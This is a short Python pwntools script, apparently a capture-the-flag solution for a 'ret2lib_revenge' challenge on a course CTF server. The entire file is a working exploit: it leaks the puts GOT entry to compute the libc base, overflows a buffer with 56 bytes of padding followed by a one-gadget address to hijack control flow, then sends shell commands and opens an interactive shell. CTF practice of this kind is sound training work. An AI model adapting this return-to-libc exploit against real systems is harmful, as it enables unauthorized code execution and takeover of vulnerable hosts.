#use gdb to find puts_got is 0x601020
#use ida to find one gadget (see picture)
from sys import stdin
import sys
from pwn import *

host="csie.ctf.tw"
port=10138
r=remote(host,port)
puts_got=0x601020
r.recvuntil(":")
r.sendline(str(puts_got))
r.recvuntil(": ")
st=r.recvuntil("\n")
put_addr = int(st.strip(),16)
put_off=0x6f690
system_off=0xef6c4
libc=put_addr-put_off
system=libc+system_off
payload="a"*56
payload+=p64(system)
r.recvuntil(":")
r.sendline(payload)

r.sendline("cd home")
r.sendline("cd ret2lib_revenge")
r.sendline("./flag.exe")
r.interactive()
